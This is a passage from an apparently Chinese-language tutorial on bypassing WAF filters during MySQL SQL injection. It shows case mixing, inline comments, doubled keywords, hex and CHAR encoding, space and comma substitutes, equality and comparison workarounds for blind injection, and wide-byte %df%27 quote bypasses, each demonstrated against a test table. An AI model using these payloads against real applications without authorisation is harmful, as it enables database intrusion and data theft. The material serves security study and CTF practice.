class="number">1234567</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users # <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="number">1234567</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span> <span class="comment">/*+1*/</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"><span class="number">12345678</span></span><br></pre></td></tr></table></figure>
<h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><p>常用于 <code>waf</code>的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">#大小写绕过</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<h1 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h1><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<h1 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h1><p>在某一些简单的<code>waf</code>中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p>
<h1 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h1><ul>
<li>十六进制绕过</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="number">0x7465737431</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ascii编码绕过<br><code>Test</code> 等价于<br><code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code><br>tip:好像新版mysql不能用了</li>
</ul>
<h1 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h1><p>一般绕过空格过滤的方法有以下几种方法来取代空格</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">()</span></span><br><span class="line">回车<span class="comment">(url编码中的%0a)</span></span><br><span class="line">`<span class="comment">(tap键上面的按钮)</span></span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">12345678</span></span><br><span class="line">#注意括号中不能含有<span class="operator">*</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>(id)<span class="keyword">from</span>(users);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"></span><br><span class="line"><span class="number">12345678</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">from</span> </span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> users</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">where</span> </span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1234567891011</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`id`<span class="keyword">from</span>`users`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br></pre></td></tr></table></figure>
<h1 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h1><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">and</span> = &amp;&amp;</span><br><span class="line"><span class="attr">or</span> = ||</span><br><span class="line"><span class="attr">xor</span> = | <span class="comment"># 异或</span></span><br><span class="line"><span class="attr">not</span> = !</span><br></pre></td></tr></table></figure>
<h1 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h1><ul>
<li>不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</li>
</ul>
<p>正常加上通配符的<code>like</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> &quot;test%&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<p>不加上通配符的<code>like</code>可以用来取代<code>=</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">like</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>用来取代<code>=</code>时，<code>rlike</code>的用法和上面的<code>like</code>一样，没有通配符效果和<code>=</code>一样</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id rlike <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id regexp <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用大小于号来绕过</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">1</span> <span class="keyword">and</span> id <span class="operator">&lt;</span> <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>&lt;&gt; 等价于 !=<br>所以在前面再加一个<code>!</code>结果就是等号了</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="operator">!</span>(id <span class="operator">&lt;&gt;</span> <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>等号绕过也可以使用strcmp(str1,str2)函数、between关键字等，具体可以参考后面的<code>过滤大小于号绕过</code></p>
<h1 id="过滤大小于号绕过"><a href="#过滤大小于号绕过" class="headerlink" title="过滤大小于号绕过"></a>过滤大小于号绕过</h1><p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过</p>
<ul>
<li>greatest(n1, n2, n3…):返回n中的最大值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(username,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="operator">=</span><span class="number">116</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>least(n1,n2,n3…):返回n中的最小值</li>
<li>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> strcmp(ascii(substr(username,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">117</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> strcmp(ascii(substr(username,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">116</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<ul>
<li>in关键字</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> (<span class="string">&#x27;t&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> (<span class="string">&#x27;y&#x27;</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<ul>
<li>between a and b:范围在a-b之间</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>使用between a and b判等</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;t&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<h1 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h1><ul>
<li>使用十六进制</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>宽字节</li>
</ul>
<p>常用在web应用使用的字符集为<code>GBK</code>时，并且过滤了引号，就可以试试宽字节。</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"># 过滤单引号时</span><br><span class="line"><span class="variable">%bf</span><span class="variable">%27</span> <span class="variable">%df</span><span class="variable">%27</span> <span class="variable">%aa</span><span class="variable">%27</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="variable">%df</span>\’ <span class="operator">=</span> <span class="variable">%df</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%27</span><span class="operator">=</span>縗’</span><br></pre></td></tr></table></figure>
<ul>
<li>char</li>
</ul>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>编码</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username = <span class="type">CHAR</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)</span><br><span class="line">%<span class="number">2527</span></span><br><span class="line">主要绕过magic_quotes_gpc过滤，因为%<span class="number">25</span>解码为%,结合后面的<span class="number">27</span>也就是%<span class="number">27</span>也就是<span class="comment">&#x27;，所以成功绕过过滤。</span></span><br></pre></td></tr></table></figure>


<h1 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h1><p>sql盲注时常用到以下的函数：</p>
<ul>
<li>substr()<ul>
<li>substr(string, pos, len):从pos开始，取长度为len的子串</li>
<li>substr(string, pos):从pos开始，取到string的最后</li>
</ul>
</li>
<li>substring()<ul>
<li>用法和<code>substr()</code>一样</li>
</ul>
</li>
<li>mid()<ul>
<li>用法和<code>substr()</code>一样，但是<code>mid()</code>是为了向下兼容<code>VB6.0</code>，已经过时，以上的几个函数的pos都是从1开始的</li>
</ul>
</li>
<li>left()和right()<ul>
<li>left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串</li>
</ul>
</li>
<li>limit<ul>
<li>limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始</li>
</ul>
</li>
<li>ascii()和char()<ul>
<li>ascii(char):把char这个字符转为ascii码</li>
<li>char(ascii_int):和ascii()的作用相反，将ascii码转字符</li>
</ul>
</li>
</ul>
<p>回到正题，如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用<code>from pos for len</code>，其中pos代表从pos个开始读取len长度的子串<br>例如在<code>substr()</code>等函数中，常规的写法是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> substr(&quot;string&quot;,<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> substr(&quot;string&quot;,<span class="number">1</span>,<span class="number">3</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> str                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果过滤了逗号，可以这样使用<code>from pos for len</code>来取代</li>
</ul>
